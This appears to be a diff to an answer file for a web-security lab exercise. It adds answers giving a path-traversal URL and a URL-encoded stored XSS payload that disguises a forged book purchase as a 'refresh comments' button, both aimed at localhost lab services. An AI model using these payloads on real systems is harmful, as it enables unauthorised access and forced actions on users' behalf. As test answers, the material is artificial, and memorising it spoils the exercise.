@@ -10,6 +10,8 @@ C01. 53 51 4C 69 74 65 20 66 6F 72 6D 61 74 - SQLite Format 3
 C02. 4 Tables exist. 5 if you include the master table
 C03. user150
 C04. battle
-C05.
-C06.
-C07.
+C05. http://localhost:8188/Service.svc/brimg?id=../BluraysBig/Noah
+C06. By creating a link on the comments page that appears to refresh the comments box, that actually purchases the Pride and Prejudice book. everyone hates Pride and Prejudice.
+C07. http://localhost:8188/Service.svc/comment?name=%3Cbutton%20onclick%3D%22window.location.href%3D%27http%3A%2F%2Flocalhost%3A8189%2FService.svc%2Fbookbuy%3Fid%3DAPridePrejudice%27%22%3EClick%20here%20to%20refresh%20the%20comments%20panel%3C%2Fbutton%3E%3Cscript%3Ealert(Shame%20you%20bought%20Pride%20and%20Prejudice!)%3C%2Fscript%3E
+
+Supporting images can be found in the app/part2_answers folder within the main ui project
